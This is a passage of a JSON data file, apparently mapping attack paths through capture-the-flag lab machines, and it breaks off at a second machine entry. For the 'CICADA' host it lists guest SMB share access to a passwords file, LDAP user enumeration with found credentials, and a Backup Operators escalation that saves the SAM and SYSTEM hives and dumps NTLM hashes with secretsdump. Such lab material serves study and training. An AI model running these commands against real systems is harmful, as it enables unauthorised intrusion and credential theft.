  "machines": [
    {
      "id": "cicada",
      "label": "CICADA",
      "ip": "10.10.11.35",
      "os": "Windows",
      "role": "AD Member",
      "networks": ["external"],
      "services": [
        {
          "port": 445,
          "name": "SMB",
          "version": "",
          "vulnerabilities": [
            {"type": "auth", "summary": "Guest SMB access to HR share", "leads_to": "michael-creds"}
          ],
          "commands": [
            {"cmd": "smbclient -N -L //10.10.11.35", "rationale": "Why: Probe for guest-accessible shares without creds"},
            "smbclient -N //10.10.11.35/HR",
            "get passwords.txt",
            "cat passwords.txt"
          ]
        },
        {
          "port": 389,
          "name": "LDAP",
          "version": "",
          "vulnerabilities": [
            {"type": "info-disclosure", "summary": "LDAP description field contains emily.oscars creds", "leads_to": "backup-operators"}
          ],
          "commands": [
            "nxc ldap 10.10.11.35 -u david.orelious -p '<password>' --users",
            "ldapsearch -x -H ldap://10.10.11.35 -D 'david.orelious@corp.local' -w '<password>' -b 'dc=corp,dc=local'"
          ]
        }
      ],
      "privesc": [
        {
          "from": "emily.oscars",
          "to": "SYSTEM",
          "technique": "Backup Operators → reg save SAM/SYSTEM → secretsdump",
          "commands": [
            {"cmd": "reg save HKLM\\SAM c:\\windows\\temp\\sam.save", "rationale": "Why: Backup Operators can export SAM for offline cracking"},
            "reg save HKLM\\SYSTEM c:\\windows\\temp\\sys.save",
            {"cmd": "impacket-secretsdump -sam sam.save -system sys.save LOCAL", "rationale": "Why: Extract NTLM hashes from exported registry hives"}
          ]
        }
      ],
      "credentials": [
        {"user": "michael.wrightson", "type": "password", "source": "HR share passwords.txt", "unlocks": ["rid-brute"]},
        {"user": "david.orelious", "type": "password", "source": "RID brute with michael.orelious", "unlocks": ["ldap"]},
        {"user": "emily.oscars", "type": "password", "source": "LDAP description field", "unlocks": ["cicada-backup"]}
      ],
      "alternatives": []
    },
    {
      "id": "files",
      "label": "FILES",
      "ip": "10.10.10.21",
      "os": "Windows",
      "role": "File Server",
      "networks": ["external"],
      "services": [
